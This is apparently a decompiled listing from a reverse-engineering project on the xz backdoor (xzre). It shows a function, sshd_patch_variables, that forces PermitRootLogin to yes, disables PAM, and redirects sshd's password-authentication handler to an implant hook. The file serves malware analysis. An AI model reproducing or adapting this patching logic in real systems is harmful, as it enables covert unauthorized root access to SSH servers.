// /home/kali/xzre-ghidra/xzregh/107D50_sshd_patch_variables.c
// Function: sshd_patch_variables @ 0x107D50
// Calling convention: unknown
// Prototype: undefined sshd_patch_variables(void)


/*
 * AutoDoc: Requires the mm_answer_authpassword hook to be resolved, then optionally forces
 * PermitRootLogin to 'yes', disables PAM when requested, and swaps the monitor authpassword
 * function pointer to the implant's hook. If no explicit monitor_reqtype override is provided it
 * derives the current request ID from the original function pointer so replies continue matching
 * sshd's state machine.
 */
#include "xzre_types.h"


undefined8 sshd_patch_variables(int param_1,int param_2,int param_3,int param_4,long param_5)

{
  int iVar1;
  long lVar2;
  long lVar3;
  int *piVar4;
  uint *puVar5;
  int *use_pam;
  int *permit_root_login;
  
  if ((((param_5 == 0) || (lVar2 = *(long *)(param_5 + 0x20), lVar2 == 0)) ||
      (lVar3 = *(long *)(lVar2 + 0x10), lVar3 == 0)) || (*(int *)(lVar2 + 4) == 0)) {
    return 0;
  }
  if (param_1 == 0) {
    piVar4 = *(int **)(lVar2 + 200);
    if (piVar4 == (int *)0x0) {
      return 0;
    }
    iVar1 = *piVar4;
    if (iVar1 < 3) {
      if (iVar1 < 0) {
        return 0;
      }
      *piVar4 = 3;
    }
    else if (iVar1 != 3) {
      return 0;
    }
  }
  if (param_2 != 0) {
    puVar5 = *(uint **)(lVar2 + 0xc0);
    if (puVar5 == (uint *)0x0) {
      return 0;
    }
    if (1 < *puVar5) {
      return 0;
    }
    *puVar5 = 0;
  }
  if (param_3 == 0) {
    param_4 = (int)(*(long **)(lVar2 + 0x38))[-1] + 1;
  }
  *(int *)(lVar2 + 0x40) = param_4;
  **(long **)(lVar2 + 0x38) = lVar3;
  return 1;
}

